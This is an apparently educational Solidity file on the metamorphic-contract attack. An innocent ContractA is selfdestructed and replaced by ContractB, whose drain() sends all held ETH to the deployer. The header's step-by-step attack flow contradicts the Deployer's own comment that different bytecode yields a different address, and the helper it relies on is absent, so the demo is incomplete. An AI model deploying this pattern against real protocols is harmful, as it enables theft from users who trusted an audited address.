// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @title DeployDifferentContract
/// @notice Demonstrates CREATE2 + selfdestruct to swap a contract at the same address
/// @dev Educational example - DO NOT USE IN PRODUCTION
///
/// Attack flow:
/// 1. Attacker deploys ContractA at address X using CREATE2 with a known salt
/// 2. Address X gets audited/approved/trusted by users or protocols
/// 3. Attacker calls selfdestruct on ContractA, clearing code at address X
/// 4. Attacker re-deploys ContractB at the SAME address X using the same salt
/// 5. Address X now runs completely different (malicious) code
///
/// NOTE: selfdestruct behavior changed significantly after the Dencun upgrade (EIP-6780).
/// Post-Dencun, selfdestruct only sends ETH but does NOT delete the contract code
/// unless called in the same transaction as the contract's creation.
/// This makes the attack much less viable on modern EVM chains.
///
/// This example is kept for educational purposes to understand the historical risk.

/// @notice Custom errors
error OnlyOwner(address caller);

/// @title ContractA - innocent-looking contract deployed via CREATE2
/// @notice A simple value store that appears trustworthy
/// @dev Has a kill() function using selfdestruct (deprecated post-Dencun)
contract ContractA {
    address public immutable owner;
    uint256 public value;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Set a value — innocent functionality
    /// @param _value The value to store
    function setValue(uint256 _value) external {
        value = _value;
    }

    /// @notice Get the stored value
    /// @return The stored value
    function getValue() external view returns (uint256) {
        return value;
    }

    /// @notice Self-destruct to clear code at this address (deprecated post-Dencun)
    /// @dev Post-EIP-6780: selfdestruct only clears code if called in the same
    ///      transaction as contract creation. Otherwise it just sends ETH.
    function kill() external {
        if (msg.sender != owner) {
            revert OnlyOwner(msg.sender);
        }
        // solhint-disable-next-line no-selfdestruct
        selfdestruct(payable(owner));
    }

    /// @notice Identify this contract
    /// @return The string "ContractA"
    function whoAmI() external pure returns (string memory) {
        return "ContractA";
    }
}

/// @title ContractB - malicious replacement with different logic
/// @notice Deployed at the same address as ContractA after selfdestruct
/// @dev Has completely different functionality than ContractA
contract ContractB {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Identify this contract — different from ContractA
    /// @return The string "ContractB"
    function whoAmI() external pure returns (string memory) {
        return "ContractB";
    }

    /// @notice Steal all ETH sent to this address
    /// @dev Since this address was previously trusted as ContractA,
    ///      protocols may have approved it to hold funds.
    function drain() external {
        if (msg.sender != owner) {
            revert OnlyOwner(msg.sender);
        }
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success);
    }

    /// @notice Accept ETH
    receive() external payable {}
}

/// @title Deployer - uses CREATE2 to deploy contracts to deterministic addresses
/// @notice Demonstrates how CREATE2 produces predictable addresses
/// @dev CREATE2 address = keccak256(0xff ++ deployer ++ salt ++ keccak256(bytecode))
///      The address depends on deployer address, salt, and init code hash.
///      Different bytecode produces a different address, so ContractB would
///      normally get a different address than ContractA.
///      The attack requires deploying through an intermediary (DeployerHelper)
///      that can be re-deployed to produce the same CREATE address.
contract Deployer {
    event Deployed(address addr);

    /// @notice Deploy ContractA using CREATE2
    /// @param salt The salt for deterministic address calculation
    /// @return addr The deployed contract address
    function deployA(bytes32 salt) external returns (address addr) {
        ContractA a = new ContractA{salt: salt}();
        addr = address(a);
        emit Deployed(addr);
    }

    /// @notice Deploy ContractB using CREATE2
    /// @param salt The salt for deterministic address calculation
    /// @return addr The deployed contract address
    function deployB(bytes32 salt) external returns (address addr) {
        ContractB b = new ContractB{salt: salt}();
        addr = address(b);
        emit Deployed(addr);
    }

    /// @notice Compute the CREATE2 address for ContractA without deploying
    /// @param salt The salt for deterministic address calculation
    /// @return The predicted address
    function computeAddressA(bytes32 salt) external view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(type(ContractA).creationCode)
            )
        );
        return address(uint160(uint256(hash)));
    }

    /// @notice Compute the CREATE2 address for ContractB without deploying
    /// @param salt The salt for deterministic address calculation
    /// @return The predicted address
    function computeAddressB(bytes32 salt) external view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(type(ContractB).creationCode)
            )
        );
        return address(uint160(uint256(hash)));
    }
}
